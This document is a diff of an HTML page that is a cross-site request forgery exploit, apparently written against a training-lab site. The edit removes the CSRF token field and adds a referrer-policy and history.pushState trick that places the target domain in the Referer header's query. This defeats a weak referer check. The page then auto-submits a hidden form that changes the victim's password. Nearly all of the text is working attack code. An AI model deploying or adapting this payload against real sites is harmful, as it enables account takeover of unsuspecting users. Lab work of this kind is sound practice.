@@ -1,17 +1,17 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>CSRF Attack</title>
-</head>
-<body>
+  <!-- Referrer policy needed to send the qury parameter in the referrer -->
+  <head><meta name="referrer" content="unsafe-url"></head>
+  <body>
+  <script>history.pushState('', '', '/')</script>
 <form action="https://web.v5zfb9ly6yxc1einjlds.labs.cyber-ed.space/main.php" method="POST">
     <input type="hidden" name="action" value="change_password">
     <input type="hidden" name="new_password" value="test">
-    <input type="hidden" name="csrf_token" value="<CSRF_TOKEN>">
-    <input type="submit" value="Submit">
-</form>
-<script>
-    document.forms[0].submit();
-</script>
-</body>
+    </form>
+    <script>
+      // You need to set this or the domain won't appear in the query of the referer header
+      history.pushState("", "", "?web.v5zfb9ly6yxc1einjlds.labs.cyber-ed.space/main.php")
+      document.forms[0].submit();
+    </script>
+  </body>
 </html>
